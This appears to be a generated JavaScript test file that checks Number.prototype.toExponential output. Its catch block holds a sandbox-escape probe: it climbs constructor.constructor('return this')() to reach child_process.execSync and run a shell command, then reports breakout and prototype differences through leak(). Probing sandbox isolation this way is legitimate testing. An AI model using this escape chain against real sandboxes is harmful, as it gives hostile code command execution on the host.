try {
    assert.sameValue(123.456.toExponential(undefined), '1.23456e+2', 'undefined');
    assert.sameValue(123.456.toExponential(), '1.23456e+2', 'no arg');
    assert.sameValue(123.456.toExponential(0), '1e+2', '0');
    assert.sameValue(1.1e-32.toExponential(undefined), '1.1e-32', 'undefined');
    assert.sameValue(1.1e-32.toExponential(), '1.1e-32', 'no arg');
    assert.sameValue(1.1e-32.toExponential(0), '1e-32', '0');
    assert.sameValue(100 .toExponential(undefined), '1e+2', 'undefined');
    assert.sameValue(100 .toExponential(), '1e+2', 'no arg');
    assert.sameValue(100 .toExponential(0), '1e+2', '0');
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}